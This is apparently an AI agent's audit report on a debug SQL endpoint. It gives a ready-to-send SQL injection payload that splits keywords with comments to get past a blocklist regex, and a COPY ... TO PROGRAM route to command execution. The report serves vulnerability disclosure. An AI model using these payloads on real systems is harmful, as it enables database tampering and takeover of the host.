Both findings are written and verified. Let me provide the completion message.

---

**Longshot anchor 16201ecf (`apps/web/src/routes/api/debug/sql/+server.ts`) complete. Drafts: 2.**

**Summary of findings:**

| Draft | Slug | Severity | Confidence | Summary |
|-------|------|----------|------------|---------|
| 001 | `comment-injection-sqli-bypass` | HIGH | high | `validateSqlQuery` `\b` word-boundary regex bypassed by inserting `/**/` inside dangerous keywords (e.g., `IN/**/SERT`). PostgreSQL strips comments; regex misses the fractured token. Combined with stacked queries, enables full DML/DDL — attacker can INSERT, UPDATE, DELETE, DROP, ALTER, TRUNCATE, or CREATE on any table. |
| 002 | `copy-to-program-missing-from-blocklist` | MEDIUM | medium | `COPY` is absent from `DANGEROUS_KEYWORDS`. As a stacked second statement (`SELECT 1; COPY ... TO PROGRAM 'cmd'`), it passes both validation gates. If the DB user has superuser / `pg_execute_server_program`, this yields OS command execution on the database host. |

**Attack chain for the primary finding (001):**

```
POST /api/debug/sql  (Authorization: Bearer <token>)
Body: {"sql": "SELECT 1; IN/**/SERT INTO users (email, password_hash) VALUES ('attacker@evil.com', 'hash')--"}

validateSqlQuery trace:
  firstToken → "SELECT"  → in ALLOWED_COMMANDS ✓
  upperQuery → "SELECT 1; IN/**/SERT INTO USERS ..."
  \bINSERT\b  → NO MATCH (broken by /**/)  ✓
  → returns { valid: true }
  
d.execute(sql`${sql.raw(query)}`)  → pg Pool.query("SELECT 1; IN/**/SERT INTO users...")
PostgreSQL strips /**/ → executes INSERT
```
